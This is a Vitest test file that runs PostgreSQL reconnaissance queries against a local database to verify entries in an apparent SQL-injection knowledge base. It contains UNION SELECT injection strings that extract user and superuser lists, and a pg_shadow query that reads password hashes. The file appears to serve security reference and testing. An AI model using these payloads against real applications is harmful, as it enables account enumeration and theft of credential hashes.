/**
 * PostgreSQL Database Credentials Tests
 *
 * @kb-coverage postgresql/database-credentials - Full coverage
 */

import { describe, test, expect, beforeAll, afterAll } from "vitest";
import {
  initDirectRunner,
  cleanupDirectRunner,
  directSQL,
  directSQLExpectSuccess,
} from "../../src/runner/direct.js";
import { logger } from "../../src/utils/logger.js";

describe("PostgreSQL Database Credentials", () => {
  beforeAll(async () => {
    logger.setLevel("warn");
    await initDirectRunner();
  }, 30000);

  afterAll(async () => {
    await cleanupDirectRunner();
  }, 10000);

  /**
   * @kb-entry postgresql/database-credentials
   * @kb-section Current User Information
   */
  describe("Current user information", () => {
    test("SELECT user returns current user", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT user");
      const user = (rows[0] as { user: string }).user;
      expect(user).toBeTruthy();
    });

    test("SELECT current_user returns current user", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT current_user");
      const user = (rows[0] as { current_user: string }).current_user;
      expect(user).toBe("postgres");
    });

    test("SELECT session_user returns session user", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT session_user");
      const user = (rows[0] as { session_user: string }).session_user;
      expect(user).toBeTruthy();
    });

    test("Check if current user is superuser", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT usesuper FROM pg_user WHERE usename = current_user"
      );
      expect(rows.length).toBe(1);
      expect(typeof (rows[0] as { usesuper: boolean }).usesuper).toBe("boolean");
    });
  });

  /**
   * @kb-entry postgresql/database-credentials
   * @kb-section User Enumeration
   */
  describe("User enumeration", () => {
    test("List all users from pg_user", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT usename FROM pg_user");
      const users = rows.map((r) => (r as { usename: string }).usename);
      expect(users).toContain("postgres");
    });

    test("List all roles from pg_roles", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT rolname FROM pg_roles");
      const roles = rows.map((r) => (r as { rolname: string }).rolname);
      expect(roles).toContain("postgres");
    });

    test("Query user privileges from pg_user", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT usename, usecreatedb, usesuper FROM pg_user"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Find superusers", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT usename FROM pg_user WHERE usesuper = true"
      );
      const superusers = rows.map((r) => (r as { usename: string }).usename);
      expect(superusers).toContain("postgres");
    });
  });

  /**
   * @kb-entry postgresql/database-credentials
   * @kb-section Password Hashes
   */
  describe("Password hashes", () => {
    test("Query pg_shadow for password hashes (if permitted)", async () => {
      // This requires superuser privileges
      const { success, result, error } = await directSQL(
        "SELECT usename, passwd FROM pg_shadow LIMIT 1"
      );
      // Either succeeds with valid result, or fails with permission denied
      if (success) {
        expect(result).toBeDefined();
        expect(Array.isArray(result?.rows)).toBe(true);
      } else {
        expect(error?.message).toMatch(/permission denied/i);
      }
    });
  });

  /**
   * @kb-entry postgresql/database-credentials
   * @kb-section Role and Privilege Information
   */
  describe("Role and privilege information", () => {
    test("Query role attributes from pg_roles", async () => {
      const { rows } = await directSQLExpectSuccess(`
        SELECT r.rolname, r.rolsuper, r.rolinherit, r.rolcreaterole, r.rolcreatedb, r.rolcanlogin
        FROM pg_roles r
      `);
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Check superuser status via current_setting", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT current_setting('is_superuser') as is_super"
      );
      expect(["on", "off"]).toContain((rows[0] as { is_super: string }).is_super);
    });

    test("Query applicable roles", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT grantee, role_name FROM information_schema.applicable_roles"
      );
      expect(rows.length).toBeGreaterThanOrEqual(0);
    });
  });

  /**
   * @kb-entry postgresql/database-credentials
   * @kb-section Injection Examples
   */
  describe("Injection context examples", () => {
    test("UNION SELECT current_user", async () => {
      const { rows } = await directSQLExpectSuccess(`
        SELECT id, username FROM users WHERE id = 1
        UNION SELECT 999, current_user
      `);
      const values = rows.map((r) => (r as { username: string }).username);
      expect(values).toContain("postgres");
    });

    test("UNION SELECT user list", async () => {
      const { rows } = await directSQLExpectSuccess(`
        SELECT id, username FROM users WHERE id = 1
        UNION SELECT 999, usename FROM pg_user
      `);
      const values = rows.map((r) => (r as { username: string }).username);
      expect(values).toContain("postgres");
    });

    test("UNION SELECT superuser status", async () => {
      const { rows } = await directSQLExpectSuccess(`
        SELECT id, username FROM users WHERE id = 1
        UNION SELECT 999, usesuper::text FROM pg_user WHERE usename=current_user
      `);
      expect(rows.length).toBeGreaterThan(0);
    });

    test("UNION SELECT superuser list", async () => {
      const { rows } = await directSQLExpectSuccess(`
        SELECT id, username FROM users WHERE id = 1
        UNION SELECT 999, string_agg(usename,',') FROM pg_user WHERE usesuper=true
      `);
      expect(rows.length).toBeGreaterThan(0);
    });
  });

  /**
   * @kb-entry postgresql/database-credentials
   * @kb-section Database Authentication Settings
   */
  describe("Database authentication settings", () => {
    test("Query hba_file location (if permitted)", async () => {
      const { success } = await directSQL("SELECT current_setting('hba_file')");
      // May be restricted, which is expected
      expect(success).toBe(true);
    });
  });
});
